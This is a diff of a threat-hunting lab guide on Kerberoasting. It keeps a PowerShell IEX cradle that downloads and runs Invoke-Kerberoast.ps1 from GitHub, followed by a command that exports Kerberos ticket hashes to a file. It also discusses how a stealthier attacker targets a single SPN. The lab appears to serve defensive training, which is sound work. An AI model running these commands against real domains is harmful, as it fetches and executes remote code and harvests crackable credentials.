@@ -118,17 +118,13 @@ Let's run it locally and save the hashes, this will avoid copy/paste errors, ope
 ```yaml
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1');
 ```
-```yaml
-cd C:\threathunt\labs\4_KERBEROAST
-```
-```yaml
-Import-Module .\Invoke-Kerberoast.ps1
-```
+
 ```yaml
 Invoke-Kerberoast | Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt
 ```
+![image](./images/02_IEX_KERB.jpg)
 
-So by default this will ***enumerate ALL SPN's*** on a domain, this of course is suspicious as a user would never to request all those tickets at the same time. A more stealthy adversary will first do his recon (GetUserSPN's for example) and see which service accounts might prove juicy targets, and then just request a **single SPN**:
+So by default this will ***enumerate amd rquest tickets for ALL SPN's*** on a domain, this of course is suspicious as a user would never to request all those tickets at the same time. A more stealthy adversary will first do his recon (GetUserSPN's for example) and see which service accounts might prove juicy targets, and then just request a **single SPN**:
 
 In the SAME **powershell** prompt:
 
